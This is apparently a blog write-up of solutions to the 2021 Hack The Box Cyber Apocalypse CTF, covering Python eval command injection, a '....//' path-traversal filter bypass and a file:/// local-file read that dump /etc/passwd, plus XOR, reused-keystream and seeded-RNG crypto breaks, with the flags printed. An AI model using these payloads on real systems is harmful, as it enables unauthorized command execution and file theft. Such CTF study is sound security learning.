---
title: "HTB Cyber Apocalypse 2021"
excerpt: "Writeups for problems solved by gp for the 2021 Hack The Box Cyber Apocalypse CTF competition."
date: 2021-04-23T09:24:19-05:00
categories:
 - Capture The Flag Writeups
---

## Intro

> Cyber Apocalypse 2021
>
> Mon, 19 April 2021, 08:00 EDT — Fri, 23 April 2021, 14:00 EDT
> 
> 22 April is International Earth Day and guess what… The Earth was hacked by malicious extraterrestrials. Their ultimate plan is to seize control of our planet. It’s only you who can save us from this terrible fate.
>
> Team Size: 1-10  
> Difficulty: Beginner to Intermediate
>
> For every challenge that gets at least one solve, Hack The Box will be making a donation to Code.org. Your goal is to hack as much as possible to help us support Code.org's mission.
> Flag Format

## Misc
### Input as a Service
> In order to blend with the extraterrestrials, we need to talk and sound like them. Try some phrases in order to check if you can make them believe you are one of them.
>
> This challenge will raise 33 euros for a good cause

This challenge only has an associated docker instance, no files. Start the docker instance, and it looks like we can connect to it using netcat:

```bash
nc 138.68.187.25 32395
2.7.18 (default, Apr 20 2020, 19:51:05)
[GCC 9.2.0]
Do you sound like an alien?
>>>
1+1
2
```

Based on the `>>>` and the fact that we got back `2` from our statement (`1+1`) it looks like it's a Python service that evals/execs whatever our input is. Python is known for having unsafe eval/import exploits for weak CTF challenges, so we try that using the following:

```python
eval("__import__('os').system('ls')")
flag.txt
input_as_a_service.py
```

Which gives us the flag:

```python
eval("__import__('os').system('cat flag.txt')")
CHTB{4li3n5_us3_pyth0n2.X?!}
```

Flag is `CHTB{4li3n5_us3_pyth0n2.X?!}`

### Alien Camp
> The Ministry of Galactic Defense now accepts human applicants for their specialised warrior unit, in exchange for their debt to be erased. We do not want to subject our people to this training and to be used as pawns in their little games. We need you to answer 500 of their questions to pass their test and take them down from the inside.
>
> This challenge will raise 33 euros for a good cause.

This challenge only has an associated docker instance, no files. Start the docker instance, and it looks like we can connect to it using netcat:

```bash
nc 165.227.231.249 30226
Alien camp 👾

1. ❓
2. Take test!
> 
```

So we have to play a game, where we're given a set of Emoji variables (and their values) and a set of functions we need to solve with basic math involving those variables:

```
nc 165.227.231.249 30226
Alien camp 👾

1. ❓
2. Take test!
> 1
Here is a little help:

🌞 -> 1 🍨 -> 72 ❌ -> 49 🍪 -> 90 🔥 -> 13 ⛔ -> 50 🍧 -> 25 👺 -> 25 👾 -> 16 🦄 -> 26

1. ❓
2. Take test!
> 2

You must answer 500 questions. You have only a few seconds for each question! Be fast! ⏰

Question 1:

🔥 + ❌ - 🔥 + 🍧 - 🌞  = ?

Answer: 69

Time: 4.20
Too slow! 🐌
```

We can just set up a script that parses out the output from the first option, as the variable values don't change over a single run. Then, it's just a matter of parsing out the variables, replacing with their value, and doing the math problem.

I was lazy, and decided to just `eval()` the resulting math formula (as a string) after replacing the variables with their values. This is the resulting script (Note, at first I ran the last block in a `while 1<2` block to determine the number of rounds, which was 500. After that, I replaced with a for loop):

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

r = remote('165.227.236.40', 32550)
r.sendlineafter('> ', '1')
r.recvline(); r.recvline()
variables = r.recvline().decode().strip().replace('->', '').split()

# Make dict of emoji -> value
variables = iter(variables)
vars = {}
for var, val in zip(variables, variables):
    vars[var] = val

r.sendlineafter('> ', '2')
for _ in range(500):
    r.recvuntil('Question ')
    r.recvline(); r.recvline()
    chal = r.recvline().decode().strip()
    # replace emoji with numerical value
    for var, val in vars.items():
        chal = chal.replace(var, val)
    # hacky/lazy: eval the resulting "1 + 45 - 67 ..." type string
    r.sendlineafter('Answer: ', str((eval(chal.split("=")[0]))))

print(r.stream())
```

Flag is `CHTB{3v3n_4l13n5_u53_3m0j15_t0_c0mmun1c4t3}`.

## Forensics
### Key mission
> The secretary of earth defense has been kidnapped. We have sent our elite team on the enemy's base to find his location. Our team only managed to intercept this traffic. Your mission is to retrieve secretary's hidden location.
>
> This challenge will raise 33 euros for a good cause.

We are given a single file to download, which is a packet capture file:

```bash
file key_mission.pcap
key_mission.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (USB with USBPcap header, capture length 134217728)
```

Inspecting in wireshark, we see a bunch of `URB_INTERRUPT`, which makes this challenge seem like we are going to need to be deciphering some message from a bluetooth device. You can try to check the `idVendor`/`idProduct` to see what the device is; I just presumed it was a bluetooth keyboard, so I ran [a previously successful/useful CTF USB keyboard parser](https://github.com/TeamRocketIst/ctf-usb-keyboard-parser/blob/master/usbkeyboard.py) on the data, and got the flag.

First, we need to extract the data from the USB device. We can do so with `tshark`:

```bash
tshark -r key_mission.pcap -T fields -e usbhid.data | sed 's/../:&/g2'| sed '/^[[:space:]]*$/d' > blah
```

Then, we just run the python tool against that file:

```
python usbkeyboard.py blah
I am sendg secretary's location over this totally encrypted channel to make sure no one else will be able to read it except of us. This information is confidential and must not be shared with anyone else. The secretary's hidden location is CHTB{a_plac3_fAr_fAr_awway_ffr0m_eearth}
```

Flag is `CHTB{a_plac3_fAr_fAr_awway_ffr0m_eearth}`.

## Crypto
### Nintendo Base64
> Aliens are trying to cause great misery for the human race by using our own cryptographic technology to encrypt all our games.
>
> Fortunately, the aliens haven't played CryptoHack so they're making several noob mistakes. Therefore they've given us a chance to recover our games and find their flags.
>
> They've tried to scramble data on an N64 but don't seem to understand that encoding and ASCII art are not valid types of encryption!
>
> This challenge will raise 33 euros for a good cause.

We get a file to download, `output.txt`:

```
            Vm                                                   0w               eE5GbFdWW         GhT            V0d4VVYwZ
            G9              XV                                   mx              yWk    ZOV       1JteD           BaV     WRH
                            YW                                   xa             c1              NsWl dS   M1   JQ WV       d4
S2RHVkljRm  Rp UjJoMlZrZH plRmRHV m5WaVJtUl hUVEZLZVZk   V1VrZFpWMU  pHVDFaV1Z  tSkdXazlXYW   twdl   Yx    Wm Fj  bHBFVWxWTlZ
Xdz     BWa 2M xVT     FSc  1d   uTl     hi R2h     XWW taS     1dG VXh     XbU ZTT     VdS elYy     cz     FWM    kY2VmtwV2
JU       RX dZ ak       Zr  U0   ZOc2JGWmlS a3       BY V1       d0 YV       lV MH       hj RVpYYlVaVFRWW  mF lV  mt       3V
lR       GV 01 ER       kh  Zak  5rVj   JFe VR       Ya Fdha   3BIV mpGU   2NtR kdX     bWx          oT   TB   KW VYxW   lNSM
Wx       XW kV kV       mJ  GWlRZ bXMxY2xWc 1V       sZ  FRiR1J5VjJ  0a1YySkdj   RVpWVmxKV           1V            GRTlQUT09
```

Which, given the name of the challenge, we pipe to base64, we get:

```bash
cat output.txt| base64 -d
Vm0xNFlWVXhSWGxUV0doWVlrZFNWRmx0ZUdGalZsSlZWR3RPYWxKdGVIcFdiR2h2VkdzeFdGVnViRmRXTTFKeVdWUkdZV1JGT1ZWVmJGWk9WakpvV1ZaclpEUlVNVWw0Vkc1U1RsWnNXbGhWYkZKWFUxWmFSMWRzV2s1V2F6VkpWbTEwYjFkSFNsbFZiRkpXWWtaYU0xcEZXbUZTTVZaeVkwVTFWMDFHYjNkV2EyTXhWakpHVjFScmFGWmlhM0JYV1ZSR1lWZEdVbFZTYms1clVsUldTbGRyV2tkV2JGcEZVVlJWUFE9PQ==
```

... which is more base64. This repeats a few times, so just continue piping to `base64 -d` to decode.

```bash
cat output.txt| base64 -d | base64 -d |base64 -d |base64 -d |base64 -d |base64 -d | base64 -d | base64 -d
CHTB{3nc0d1ng_n0t_3qu4l_t0_3ncrypt10n}
```

Flag is `CHTB{3nc0d1ng_n0t_3qu4l_t0_3ncrypt10n}`.


### PhaseStream 1
> The aliens are trying to build a secure cipher to encrypt all our games called "PhaseStream". They've heard that stream ciphers are pretty good. The aliens have learned of the XOR operation which is used to encrypt a plaintext with a key. They believe that XOR using a repeated 5-byte key is enough to build a strong stream cipher. Such silly aliens! Here's a flag they encrypted this way earlier.
>
> Can you decrypt it (hint: what's the flag format?)
>
> 2e313f2702184c5a0b1e321205550e03261b094d5c171f56011904
>
> This challenge will raise 33 euros for a good cause.

We're given the hexstring, and the information that the key is 5 bytes. Since we know the first five bytes of the plaintext (flag format, `CHTB{`) we can fully recover the key. To find the key, just iterate over all printable characers XOR'ing against the index of the ciphertext, until we get a plaintext that is equal to the character of the flag format at at that index.

```python
#!/usr/bin/env python3
from string import printable as alphabet
from binascii import unhexlify

with open('./phasestream1_enc', 'r') as infile:
    ct = unhexlify(infile.read().strip())

# key is length 5, we know the first 5 chars of the flag
# should be CHTB{, we can recover the key fully:
flag="CHTB{"
key = ""
for idx in range(5):
    for char in alphabet:
        if chr(ord(char) ^ ct[idx]) == flag[idx]:
            key += char
print(key)
```

Which tells us the key is `mykey`. Now just [repeating key XOR the ciphertext with that](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'mykey'%7D,'Standard',false)&input=MmUzMTNmMjcwMjE4NGM1YTBiMWUzMjEyMDU1NTBlMDMyNjFiMDk0ZDVjMTcxZjU2MDExOTA0) and get the flag.

Flag is `CHTB{u51ng_kn0wn_pl41nt3xt}`.

### PhaseStream 2
> The aliens have learned of a new concept called "security by obscurity". Fortunately for us they think it is a great idea and not a description of a common mistake. We've intercepted some alien comms and think they are XORing flags with a single-byte key and hiding the result inside 9999 lines of random data, Can you find the flag?
>
> This challenge will raise 33 euros for a good cause.

We get a file to download, `output.txt`, which has the 9999 lines of hexadecimal strings:

```bash
cat output.txt
3cc60a255dd328130e4203bb42f3be22d2935dbe5d9ebf498ce2
44e4088c49ce3aea69832d3c0a6cd43443ab1865daab8eab0fdc
bc0e3b0b7a600d5ff319ba661f6a077b058f1bd73c2c8f646c78
594a7cdfe5fe79edf5060c0ccd26304fd7bb9175f0ff6e6bc935
f807d7abd0cf8f82f56c22b59f1d22fcf1732163dcc4062a3f18
0d7fc2a812c0be988ef197bd7685876c8ff332f77dd5c8fb4ceb
5a04f0ecfa3b681930c29858f7e4f6f44f34c87f88533dd3ac17
93828080662b73d05deaf98e7a574b997f7e7c242619a541cb26
4b716313567479d19e64d0aa6794af8eac7d2e0c6f0475b7c0e6
947483e68b992c56db9bb7a9c89b1cee148539ed9745e9788512
8df67b148bcc59d5a3169a4e984599a33766ca3d6dff9259a799
c4a2b09d908942b57abf095e8cf046ccb31fd511ff37ce87a082
ef8ba78efb0dc4a8acc4e4d61f4bd231d245026c49589c2d883d
...
```

We are also given the length of the key used to XOR: which is only 1 byte! Brute forcing through the text against all possible keys is easy enough, and we just need to look for "`CHTB{`" since we know the flag format as well.

You could code something simple, I used `xortool` though:

```bash
xortool -b -l 1 -x -p CHTB output.txt

strings xortool_out/* | grep CHTB
CHTB{n33dl3_1n_4_h4yst4ck}_*x
```

Flag is `CHTB{n33dl3_1n_4_h4yst4ck}`.

### PhaseStream 3
> The aliens have learned the stupidity of their misunderstanding of Kerckhoffs's principle. Now they're going to use a well-known stream cipher (AES in CTR mode) with a strong key. And they'll happily give us poor humans the source because they're so confident it's secure!
>
> This challenge will raise 33 euros for a good cause.

We are given twp files to download, `output.txt`:

```
cat crypto_ps3/output.txt
464851522838603926f4422a4ca6d81b02f351b454e6f968a324fcc77da30cf979eec57c8675de3bb92f6c21730607066226780a8d4539fcf67f9f5589d150a6c7867140b5a63de2971dc209f480c270882194f288167ed910b64cf627ea6392456fa1b648afd0b239b59652baedc595d4f87634cf7ec4262f8c9581d7f56dc6f836cfe696518ce434ef4616431d4d1b361c
4b6f25623a2d3b3833a8405557e7e83257d360a054c2ea
```

... and the file that produced it:

```python
from Crypto.Cipher import AES
from Crypto.Util import Counter
import os

KEY = os.urandom(16)

def encrypt(plaintext):
    cipher = AES.new(KEY, AES.MODE_CTR, counter=Counter.new(128))
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()

test = b"No right of private conversation was enumerated in the Constitution. I don't suppose it occurred to anyone at the time that it could be prevented."
print(encrypt(test))

with open('flag.txt', 'rb') as f:
    flag = f.read().strip()
print(encrypt(flag))
```

So, we're given some things:

1. We know the IV (or lack thereof)
2. Mode of AES (CTR)
3. Counter size
4. Plaintext encrypted with the key, and it's associated ciphertext.

The key things being number 1 and 4. With this information, [we are able to arbitrarily encrypt any data we want if we have two cipher texts with the same nonce](https://blog.srikavin.me/posts/picoctf-2018-electric/).  Shout out to Srikavin Ramkumar for the awesome code on that page, that works just about verbatim for this same problem:

```python
#!/usr/bin/env python3
from base64 import b64decode,b64encode

known_plaintext = "No right of private conversation was enumerated in the Constitution. I don't suppose it occurred to anyone at the time that it could be prevented."
# cat output.txt| head -n1 | xxd -r -p | base64
known_cipher_b64 = "RkhRUig4YDkm9EIqTKbYGwLzUbRU5vlooyT8x32jDPl57sV8hnXeO7kvbCFzBgcGYiZ4Co1FOfz2f59VidFQpseGcUC1pj3ilx3CCfSAwnCIIZTyiBZ+2RC2TPYn6mOSRW+htkiv0LI5tZZSuu3FldT4djTPfsQmL4yVgdf1bcb4Ns/mllGM5DTvRhZDHU0bNhw="
known_cipher = b64decode(known_cipher_b64)
print("known_cipher length %d" % len(known_cipher))

# Encryption and decryption are symmetric operations; encrypting a ciphertext will reveal its value
def encrypt(key, plaintext):
    ret = bytearray()
    for i in range(0, len(plaintext)):
        ret.append(key[i%len(key)] ^ ord(plaintext[i]))
    return ret

# lazy, don't want to not have to specify "ord":
def decrypt(key, plaintext):
    ret = bytearray()
    for i in range(0, len(plaintext)):
        ret.append(key[i%len(key)] ^ plaintext[i])
    return ret

key = bytearray()
for i in range(0, 32):
    key.append(known_cipher[i] ^ ord(known_plaintext[i]))

print("key %s" % key)
print("key length %d" % len(key))
# echo '4b6f25623a2d3b3833a8405557e7e83257d360a054c2ea' | xxd -r -p | base64
flag_enc = "S28lYjotOzgzqEBVV+foMlfTYKBUwuo="
enc = b64decode(flag_enc)

print(decrypt(key, enc))
```

Which when ran:

```python
python solve.py
known_cipher length 146
key bytearray(b"\x08\'q A_\x08M\x06\x9b$\n<\xd4\xb1mc\x874\x947\x89\x97\x1e\xc6V\x8f\xa6\t\xcac\x97")
key length 32
bytearray(b'CHTB{r3u53d_k3Y_4TT4cK}')
```

Flag is `CHTB{r3u53d_k3Y_4TT4cK}`.

### SoulCrabber
> Aliens heard of this cool newer language called Rust, and hoped the safety it offers could be used to improve their stream cipher.
>
> This challenge will raise 33 euros for a good cause.

We are given two files for downloads, the output (`out.txt`):

```
1b591484db962f7782d1410afa4a388f7930067bcef6df546a57d9f873
```

And the *Rust (!!!)* program that output it:

```rust
use rand::{Rng,SeedableRng};
use rand::rngs::StdRng;
use std::fs;
use std::io::Write;

fn get_rng() -> StdRng {
    let seed = 13371337;
    return StdRng::seed_from_u64(seed);
}

fn rand_xor(input : String) -> String {
    let mut rng = get_rng();
    return input
        .chars()
        .into_iter()
        .map(|c| format!("{:02x}", (c as u8 ^ rng.gen::<u8>())))
        .collect::<Vec<String>>()
        .join("");
}

fn main() -> std::io::Result<()> {
    let flag = fs::read_to_string("flag.txt")?;
    let xored = rand_xor(flag);
    println!("{}", xored);
    let mut file = fs::File::create("out.txt")?;
    file.write(xored.as_bytes())?;
    Ok(())
}
```

So, this looks like a trivial "re-implement this statically seeded RNG" xor challenge; I guess the twist is that it's _Rust_? But if you're anyone who's anyone, you probably have already written some rust ;)  I wrote up the solve using a [Cargo](https://doc.rust-lang.org/cargo/) project.

My `Cargo.toml`:

```toml
[package]
name = "SoulCrabber"
version = "0.1.0"
authors = ["HTB CTF"]
edition = "2018"

[dependencies]
rand = "0.8.3"
hex = "0.3.1"
```

And my `src/main.rs` (which is mostly just the given source file, but with a `un_xor` function, that is mostly the original XOR function but takes a vec as input instead of a string):

```rust
use hex::decode;
use rand::rngs::StdRng;
use rand::{Rng, SeedableRng};
use std::fs;
//use std::io::Write;

fn get_rng() -> StdRng {
    let seed = 13371337;
    return StdRng::seed_from_u64(seed);
}

fn rand_xor(input: String) -> String {
    let mut rng = get_rng();
    return input
        .chars()
        .into_iter()
        .map(|c| format!("{:02x}", (c as u8 ^ rng.gen::<u8>())))
        .collect::<Vec<String>>()
        .join("");
}

fn un_xor(input: Vec<u8>) -> String {
    // Same seed, bad
    let mut rng = get_rng();
    return input
        .into_iter()
        .map(|c| format!("{:02x}", (c as u8 ^ rng.gen::<u8>())))
        .collect::<Vec<String>>()
        .join("");
}

fn main() -> std::io::Result<()> {
    let xored = fs::read_to_string("out.txt").expect("you fucked this up bigtime");
    let decoded = decode(&xored).expect("");
    let unenc = un_xor(decoded);
    println!("{}", String::from_utf8_lossy(&decode(&unenc).expect("")));
    Ok(())
}
```

Then, just run like so:

```rust
cargo run
...
CHTB{mem0ry_s4f3_crypt0_f41l}
```

Flag is `CHTB{mem0ry_s4f3_crypt0_f41l}`.

### SoulCrabber 2
> Aliens realised that hard-coded values are bad, so added a little bit of entropy.
>
> This challenge will raise 43 euros for a good cause.

OK, so this is a follow up to [SoulCrabber](#soulcrabber), which was a trivial static/hardcoded seeded RNG XOR reverse.

We are given two files again, the `out.txt` file:

```
418a5175c38caf8c1cafa92cde06539d512871605d06b2d01bbc1696f4ff487e9d46ba0b5aaf659807
```

... and the rust file that produced it:

```rust
use rand::{Rng,SeedableRng};
use rand::rngs::StdRng;
use std::fs;
use std::io::Write;
use std::time::SystemTime;

fn get_rng() -> StdRng {
    let seed = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .expect("Time is broken")
        .as_secs();
    return StdRng::seed_from_u64(seed);
}

fn rand_xor(input : String) -> String {
    let mut rng = get_rng();
    return input
        .chars()
        .into_iter()
        .map(|c| format!("{:02x}", (c as u8 ^ rng.gen::<u8>())))
        .collect::<Vec<String>>()
        .join("");
}

fn main() -> std::io::Result<()> {
    let flag = fs::read_to_string("flag.txt")?;
    let xored = rand_xor(flag);
    println!("{}", xored);
    let mut file = fs::File::create("out.txt")?;
    file.write(xored.as_bytes())?;
    Ok(())
}
```

So, this time around, the _aliens_ are no longer using a provided static seed (notice `get_rng()`). Instead, the RNG is being seeded with a SystemTime timestamp, with second resolution, since epoch. So the RNG was seeded with the time the program was run originally.

We know when the CTF _started_, so we know that the time has to be before that. It's probably also the case that the program was run relatively close to that start time (so that we have a feasible way of reversing the seed). 

Thus, to reverse the "random" seed, we can just get the second timestamp from the time of the official CTF start, and work backwards by 1 second, checking the RNG generations until we hit the seed that generated the same values as the challenge.

So, we want to get a timestamp that's equal to the official start time of the CTF:

```rust
    // Start at competition start time, and work backwards:
    let dt = Utc
        .ymd(2021, 4, 19)
        .and_hms_milli(12, 00, 00, 000)
        .timestamp_millis()
        / 1000;
```

Then, once we have that, we just work backwards trying to "un"-XOR the ciphertext with the current seed, looking for our known partial plaintext (the flag format, `CHTB{`):

```rust
    for time in (0..dt).rev() {
        let unenc = un_xor(&decoded, time);
        if String::from_utf8_lossy(&decode(&unenc).expect("")).contains("CHTB") {
            println!("Found original seed! {}", time);
            println!("{}", String::from_utf8_lossy(&decode(&unenc).expect("")));
            std::process::exit(1);
        };
    }
```

I used a [Cargo](https://doc.rust-lang.org/cargo/) project to wrap the code up and run it; my `Cargo.toml`:

```toml
[package]
name = "SoulCrabber-2"
version = "0.1.0"
authors = ["HTB CTF"]
edition = "2018"

[dependencies]
rand = "0.8.3"
hex = "0.3.1"
chrono = "0.4.6"
```

... and my `src/main.rs` (which includes the mentioned blocks above, with the other required wrappings for seeding/getting ciphertext/etc):

```rust
use chrono::TimeZone;
use chrono::Utc;
use chrono::{NaiveDate, NaiveDateTime};
use hex::decode;
use rand::rngs::StdRng;
use rand::{Rng, SeedableRng};
use std::convert::TryInto;
use std::fs;

fn get_seeded_rng(seed: i64) -> StdRng {
    return StdRng::seed_from_u64(seed.try_into().unwrap());
}

fn un_xor(input: &Vec<u8>, seed: i64) -> String {
    let mut rng = get_seeded_rng(seed);
    return input
        .into_iter()
        .map(|c| format!("{:02x}", (*c as u8 ^ rng.gen::<u8>())))
        .collect::<Vec<String>>()
        .join("");
}

fn main() -> std::io::Result<()> {
    // Start at competition start time, and work backwards:
    let dt = Utc
        .ymd(2021, 4, 19)
        .and_hms_milli(12, 00, 00, 000)
        .timestamp_millis()
        / 1000;

    let xored = fs::read_to_string("out.txt").expect("you fucked this up bigtime");
    let decoded = decode(&xored.trim()).expect("");
    println!("Starting at seed {} and working backwards...", dt);
    for time in (0..dt).rev() {
        let unenc = un_xor(&decoded, time);
        if String::from_utf8_lossy(&decode(&unenc).expect("")).contains("CHTB") {
            println!("Found original seed! {}", time);
            println!("{}", String::from_utf8_lossy(&decode(&unenc).expect("")));
            std::process::exit(1);
        };
    }
    Ok(())
}
```

Which we can run and get the following output (which includes eventually finding the flag):

```
cargo run
...
    Finished dev [unoptimized + debuginfo] target(s) in 0.07s
     Running `target/debug/SoulCrabber-2`
Starting at seed 1618833600 and working backwards...
Found original seed! 1618179277
CHTB{cl4551c_ch4ll3ng3_r3wr1tt3n_1n_ru5t}
```

Which, on my machine (which is shit), took 50 seconds.

Flag is `CHTB{cl4551c_ch4ll3ng3_r3wr1tt3n_1n_ru5t}`.

## Web
### Inspector Gadget
> Inspector Gadget was known for having a multitude of tools available for every occasion. Can you find them all?
>
> This challenge will raise 33 euros for a good cause.

We get a docker instance that is running the code/service; navigating to the URL/home page, we see:

{{< image src="/img/CTFs/2021/cyber_apocalypse/gp/gadget_home.png" alt="gadget_home.png" position="center" style="border-radius: 8px;" >}}

So we can see the first part of the flag, `CHTB{`. Now we just need to find the rest. Presumably, is in a bunch of "easy" places given this is the most solved Web challenge.

Going to the "developer tools" with your browser settings, we see another part in the console:

```
us3full_1nf0rm4tion}
```

So that's the ending. Looking through the source code, we can see the following in the `main.css` file:

```css
/* c4n_r3ve4l_ */
```

And also the following in the main index HTML:

```html
   <!--1nsp3ction_-->
```

So, the flag is `CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}`.

### MiniSTRyplace
> Let's read this website in the language of Alines. Or maybe not?
>
> This challenge will raise 33 euros for a good cause.

We have a docker instance, and the full source code of the challenge. 

Looking at the given `index.php`:

{{< highlight php "linenos=true" >}}
<html>
    <header>
        <meta name='author' content='bertolis, makelaris'>
        <title>Ministry of Defence</title>
        <link rel="stylesheet" href="/static/css/main.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootswatch/4.5.0/slate/bootstrap.min.css"   >
    </header>

    <body>
    <div class="language">
        <a href="?lang=en.php">EN</a>
        <a href="?lang=qw.php">QW</a>
    </div>

    <?php
    $lang = ['en.php', 'qw.php'];
        include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : $lang[array_rand($lang)]));
    ?>
    </body>
</html>
{{< / highlight >}}

We see something very concerning. Notice that bit of code on **line 17** (also, the name of the challenge).

So this is a `str_replace` exploit. Since we can directly control what page is being included , all we have to do is give a path to a file on the remote system, and it will get included onto the page for us.

A minor wrinkle is that the service is filtering `../` input, so you couldn't just pass `../../../../../../etc/passwd` to get `/etc/passwd`. A [simple workaround](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#filter-bypass-tricks) works fine:

```
/?lang=....//....//....//....//....//....//....//....//....//etc/passwd
```

Gives the `/etc/passwd` file! >:) Since we're given the source code, we know the flag file is just one directory up, so we can just give:

```
/?lang=....//....//flag
```

And we see the flag.

Flag is `CHTB{b4d_4li3n_pr0gr4m1ng}`.

### Caas
> cURL As A Service or CAAS is a brand new Alien application, built so that humans can test the status of their websites. However, it seems that the Aliens have not quite got the hang of Human programming and the application is riddled with issues.
>
> This challenge will raise 43 euros for a good cause.

We get a docker instance, as well as full source code for the running service.

{{< image src="/img/cyber_apocalypse/gp/curl_home.png" alt="curl_home.png" position="center" style="border-radius: 8px;" >}}

So, looking at the given source files, we have the following main `.js` code:

{{< highlight javascript "linenos=true" >}}
var input = document.getElementById('command');
var output = document.getElementById("console-output");

document.getElementById("command").addEventListener('keydown', (e) => {
  if (e.keyCode === 13) {

    let host = input.value;

    try {
      new URL(host);
    } catch {
      return output.innerHTML = "Illegal Characters Detected";
    }

    output.innerHTML = '';

    fetch('/api/curl', {
      method: 'POST',
      body: `ip=${host}`,
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    })
    .then(resp => resp.json())
    .then(data => {
      output.innerHTML = data.message;
    });

    input.value = '';
  }
});
{{< / highlight >}}

So, basically whatever we input, it generates into a [Javascript URL (via `new URL(host);`)](https://developer.mozilla.org/en-US/docs/Web/API/URL/URL). Then it goes out and fetches those contents. 

For example, giving `http://www.example.com` we get that site:

{{< image src="/img/cyber_apocalypse/gp/curl_example.png" alt="curl_example.png" position="center" style="border-radius: 8px;" >}}

My initial thought was that we'd be getting Local File inclusion, by trying to get the service to read/include files from the hosting service; Passing `http://127.0.0.1` gives the same service page.

Using the [`file://` syntax, we should be able to access a local file](https://stackoverflow.com/questions/14052473/go-to-local-url-with-javascript) as if it was a URL!

Trying `file:///etc/passwd`, we get the file contents!

{{< image src="/img/cyber_apocalypse/gp/curl_passwd.png" alt="curl_passwd.png" position="center" style="border-radius: 8px;" >}}

Sweet. Now it's just a matter of finding the path to the flag. I tried `/flag` initially, and that gave the flag right away:) 

* `file:///flag`

{{< image src="/img/cyber_apocalypse/gp/curl_flag.png" alt="curl_flag.png" position="center" style="border-radius: 8px;" >}}

Flag is `CHTB{f1le_r3trieval_4s_a_s3rv1ce}`.

